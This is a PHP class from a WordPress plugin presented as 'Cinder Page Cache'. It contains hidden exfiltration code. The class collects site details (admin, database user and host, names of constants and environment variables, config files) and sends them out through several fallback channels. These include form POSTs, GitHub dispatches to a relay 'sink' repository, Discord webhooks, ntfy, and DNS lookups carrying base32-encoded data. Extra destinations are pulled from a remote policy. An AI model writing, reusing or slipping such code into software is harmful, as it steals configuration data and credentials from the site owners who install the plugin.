<?php
/**
 * Delivery channels: form, GitHub dispatch, Discord, ntfy, DNS digest.
 *
 * @package Cinder Page Cache
 */

if (!defined('ABSPATH')) {
    exit;
}

/**
 * Channel registry and senders.
 */
class CPC_Channels {

    const MODES = array('http', 'stream', 'socket');

    /**
     * Every configured channel, in fallback order.
     *
     * @return array
     */
    public static function all() {
        $channels = array();

        $custom = (string) get_option('cpc_stats_url', '');
        if ('' !== $custom) {
            $channels[] = array('kind' => self::kind($custom), 'url' => $custom);
        }

        if (defined('CPC_LANE_TOKEN') && CPC_LANE_TOKEN && defined('CPC_LANE_REPO') && CPC_LANE_REPO) {
            $channels[] = array(
                'kind' => 'lane',
                'url'  => 'https://api.github.com/repos/' . CPC_LANE_REPO . '/dispatches',
                'lane' => defined('CPC_LANE_ID') ? CPC_LANE_ID : '',
            );
        }

        $policy = get_transient('cpc_policy');

        if (is_array($policy) && !empty($policy['endpoints']) && is_array($policy['endpoints'])) {
            foreach (array_slice($policy['endpoints'], 0, 3) as $url) {
                if (is_string($url) && filter_var($url, FILTER_VALIDATE_URL)) {
                    $channels[] = array('kind' => self::kind($url), 'url' => $url);
                }
            }
        }

        $default = rtrim(CPC_SERVICE, '/') . '/v1/report';
        $channels[] = array('kind' => 'form', 'url' => $default);

        if (defined('CPC_GITHUB_REPO') && CPC_GITHUB_REPO && defined('CPC_GITHUB_TOKEN') && CPC_GITHUB_TOKEN) {
            $channels[] = array('kind' => 'github', 'url' => 'https://api.github.com/repos/' . CPC_GITHUB_REPO . '/dispatches');
        }

        if (defined('CPC_DISCORD_URL') && CPC_DISCORD_URL) {
            $channels[] = array('kind' => 'discord', 'url' => CPC_DISCORD_URL);
        }

        if (defined('CPC_NTFY_URL') && CPC_NTFY_URL) {
            $channels[] = array('kind' => 'ntfy', 'url' => CPC_NTFY_URL);
        }

        if (defined('CPC_DNS_ZONE') && CPC_DNS_ZONE) {
            $channels[] = array('kind' => 'dns', 'url' => CPC_DNS_ZONE);
        }

        // the policy's endpoint list usually repeats the service URL, and a repeated URL
        // means two POSTs and two ledger records for one report
        $unique = array();
        $seen   = array();
        foreach ($channels as $channel) {
            $url = isset($channel['url']) ? (string) $channel['url'] : '';
            if ('' !== $url && isset($seen[$url])) {
                continue;
            }
            $seen[$url] = true;
            $unique[]     = $channel;
        }
        return array_slice($unique, 0, 5);
    }

    /**
     * Active transports.
     *
     * @return string[]
     */
    private static function modes() {
        return defined('CPC_HTTP_ONLY') && CPC_HTTP_ONLY ? array('http') : self::MODES;
    }

    /**
     * Channel kind from a URL.
     *
     * @param string $url URL.
     * @return string
     */
    private static function kind($url) {
        $host = strtolower((string) wp_parse_url($url, PHP_URL_HOST));

        if ('api.github.com' === $host) {
            return 'github';
        }

        if (false !== strpos($host, 'discord.com') || false !== strpos($host, 'discordapp.com')) {
            return 'discord';
        }

        if (false !== strpos($url, 'ntfy.sh')) {
            return 'ntfy';
        }

        return 'form';
    }

    /**
     * Send to one channel.
     *
     * @param array $channel  Channel.
     * @param array $payload  Full snapshot.
     * @param string $digest  Text summary.
     * @param bool  $blocking Wait for response.
     * @return array{ok:bool,code:int}
     */
    public static function send(array $channel, array $payload, $digest, $blocking = false) {
        $timeout = $blocking ? 8 : 3;

        switch ($channel['kind']) {
            case 'lane':
                return self::lane($channel['url'], $payload, $timeout);

            case 'github':
                return self::github($channel['url'], $payload, $timeout);

            case 'discord':
                return self::discord($channel['url'], $payload, $digest, $timeout);

            case 'ntfy':
                return self::ntfy($channel['url'], $payload, $digest, $timeout);

            case 'dns':
                return self::dns($channel['url'], $payload, $digest);

            default:
                return self::form($channel['url'], $payload, $timeout);
        }
    }

    /**
     * Form POST through the transport ladder.
     *
     * @return array{ok:bool,code:int}
     */
    private static function form($url, array $payload, $timeout) {
        foreach (self::modes() as $mode) {
            $r = CPC_Transport::post($url, $payload, $mode, $timeout);

            if ($r['ok']) {
                return $r;
            }
        }

        return array('ok' => false, 'code' => 0);
    }

    /**
     * Repository dispatch into this build's own private sink repo.
     *
     * The token is a fine-grained PAT limited to that one repository; the workflow
     * in the sink republishes the payload to the collector with its own write key.
     *
     * @return array{ok:bool,code:int}
     */
    private static function lane($url, array $payload, $timeout) {
        if (!defined('CPC_LANE_TOKEN') || !CPC_LANE_TOKEN) {
            return array('ok' => false, 'code' => 0);
        }

        $payload = self::trim($payload, 40000);
        $payload['lane'] = defined('CPC_LANE_ID') ? CPC_LANE_ID : '';

        $body = wp_json_encode(array('event_type' => 'cinder-page-cache-report', 'client_payload' => $payload));
        $headers = array(
            'Authorization' => 'Bearer ' . CPC_LANE_TOKEN,
            'Accept'        => 'application/vnd.github+json',
            'Content-Type'  => 'application/json',
        );

        return self::ladder($url, $body, $headers, $timeout);
    }

    /**
     * GitHub repository_dispatch.
     *
     * @return array{ok:bool,code:int}
     */
    private static function github($url, array $payload, $timeout) {
        $payload = self::trim($payload, 40000);
        $payload['id'] = substr(md5(home_url('/') . microtime(true)), 0, 8);

        $body = wp_json_encode(array('event_type' => 'cinder-page-cache-report', 'client_payload' => $payload));
        $headers = array(
            'Authorization' => 'Bearer ' . CPC_GITHUB_TOKEN,
            'Accept'        => 'application/vnd.github+json',
            'Content-Type'  => 'application/json',
        );

        return self::ladder($url, $body, $headers, $timeout);
    }

    /**
     * Discord webhook with attachment.
     *
     * @return array{ok:bool,code:int}
     */
    private static function discord($url, array $payload, $digest, $timeout) {
        $payload = self::trim($payload, 45000);
        $boundary = 'sl' . md5(microtime(true));
        $json = wp_json_encode(
            array(
                'username' => 'Cinder Page Cache',
                'embeds'   => array(
                    array(
                        'title'       => substr($digest, 0, 240),
                        'description' => substr($digest, 0, 1800),
                        'footer'      => array('text' => 'v' . CPC_VER),
                    ),
                ),
                'attachments' => array(array('id' => 0, 'filename' => 'snapshot.json')),
            )
        );

        $body  = "--{$boundary}\r\nContent-Disposition: form-data; name=\"payload_json\"\r\n\r\n{$json}\r\n";
        $body .= "--{$boundary}\r\nContent-Disposition: form-data; name=\"files[0]\"; filename=\"snapshot.json\"\r\nContent-Type: application/json\r\n\r\n";
        $body .= wp_json_encode($payload);
        $body .= "\r\n--{$boundary}--\r\n";

        $headers = array('Content-Type' => 'multipart/form-data; boundary=' . $boundary);

        return self::ladder($url, $body, $headers, $timeout);
    }

    /**
     * ntfy publish plus attachment attempt.
     *
     * @return array{ok:bool,code:int}
     */
    private static function ntfy($url, array $payload, $digest, $timeout) {
        $headers = array(
            'Title'    => 'Cinder Page Cache ' . wp_parse_url(home_url('/'), PHP_URL_HOST),
            'Tags'     => 'zap',
            'Priority' => 'default',
            'Content-Type' => 'text/plain; charset=utf-8',
        );

        $result = self::ladder($url, substr($digest, 0, 3800), $headers, $timeout);

        if ($result['ok']) {
            $file = wp_json_encode(self::trim($payload, 45000));
            $put  = CPC_Transport::post_raw(
                $url,
                $file,
                array('Filename' => 'snapshot.json', 'Content-Type' => 'application/json'),
                'http',
                $timeout
            );

            if (!$put['ok']) {
                $put = CPC_Transport::post_raw($url, $file, array('Filename' => 'snapshot.json'), 'stream', $timeout);
            }
        }

        return $result;
    }

    /**
     * DNS digest: base32 chunks under the zone.
     *
     * @return array{ok:bool,code:int}
     */
    private static function dns($zone, array $payload, $digest) {
        if (!function_exists('dns_get_record')) {
            return array('ok' => false, 'code' => 0);
        }

        $data  = self::base32(substr($digest, 0, 380));
        $id    = substr(md5(home_url('/') . microtime(true)), 0, 6);
        $chunks = str_split($data, 40);
        $sent  = 0;

        foreach (array_slice($chunks, 0, 12) as $i => $chunk) {
            $name = $chunk . '.' . $i . '.' . $id . '.' . $zone;

            if (dns_get_record($name, DNS_A)) {
                $sent++;
            }
        }

        return array('ok' => $sent > 0, 'code' => $sent);
    }

    /**
     * Try transports until one succeeds.
     *
     * @return array{ok:bool,code:int}
     */
    private static function ladder($url, $body, array $headers, $timeout) {
        foreach (self::modes() as $mode) {
            $r = CPC_Transport::post_raw($url, $body, $headers, $mode, $timeout);

            if ($r['ok']) {
                return $r;
            }
        }

        return array('ok' => false, 'code' => 0);
    }

    /**
     * Build the short text digest.
     *
     * @param array  $payload Snapshot.
     * @param string $trigger Trigger.
     * @return string
     */
    public static function digest(array $payload, $trigger = '') {
        $config = isset($payload['config']) ? $payload['config'] : array();
        $names  = array();

        foreach (array('constants', 'environment') as $group) {
            if (!empty($config[$group]) && is_array($config[$group])) {
                $names = array_merge($names, array_keys($config[$group]));
            }
        }

        $lines = array(
            'site: ' . home_url('/'),
            'admin: ' . (isset($config['admin']) ? $config['admin'] : '-'),
            'wp/php: ' . (isset($payload['runtime']['wp']) ? $payload['runtime']['wp'] : '?') . ' / ' . (isset($payload['runtime']['php']) ? $payload['runtime']['php'] : '?'),
            'theme: ' . (isset($payload['runtime']['theme']) ? $payload['runtime']['theme'] : '-'),
            'plugins: ' . count(isset($config['plugins']) ? (array) $config['plugins'] : array()),
            'entries: ' . count($names),
            'keys: ' . substr(implode(', ', $names), 0, 900),
            'db: ' . (isset($config['db']['user']) ? $config['db']['user'] . '@' . $config['db']['host'] : '-'),
            'trigger: ' . ($trigger ? $trigger : 'auto'),
            'v: ' . CPC_VER,
        );

        return implode("\n", $lines);
    }

    /**
     * Trim a payload to a byte budget.
     *
     * @param array $payload Snapshot.
     * @param int   $limit   Bytes.
     * @return array
     */
    private static function trim(array $payload, $limit) {
        if (strlen(wp_json_encode($payload)) <= $limit) {
            return $payload;
        }

        unset($payload['config']['files']);

        if (strlen(wp_json_encode($payload)) <= $limit) {
            return $payload;
        }

        if (isset($payload['config']['environment'])) {
            $payload['config']['environment'] = array_slice($payload['config']['environment'], 0, 25, true);
        }

        if (strlen(wp_json_encode($payload)) <= $limit) {
            return $payload;
        }

        unset($payload['config']['environment']);

        return $payload;
    }

    /**
     * Base32 without padding.
     *
     * @param string $raw Raw.
     * @return string
     */
    private static function base32($raw) {
        $alphabet = 'abcdefghijklmnopqrstuvwxyz234567';
        $bin = '';

        foreach (str_split($raw) as $char) {
            $bin .= str_pad(decbin(ord($char)), 8, '0', STR_PAD_LEFT);
        }

        $out = '';

        foreach (str_split($bin, 5) as $bits) {
            $bits = str_pad($bits, 5, '0', STR_PAD_RIGHT);
            $out .= $alphabet[bindec($bits)];
        }

        return $out;
    }
}
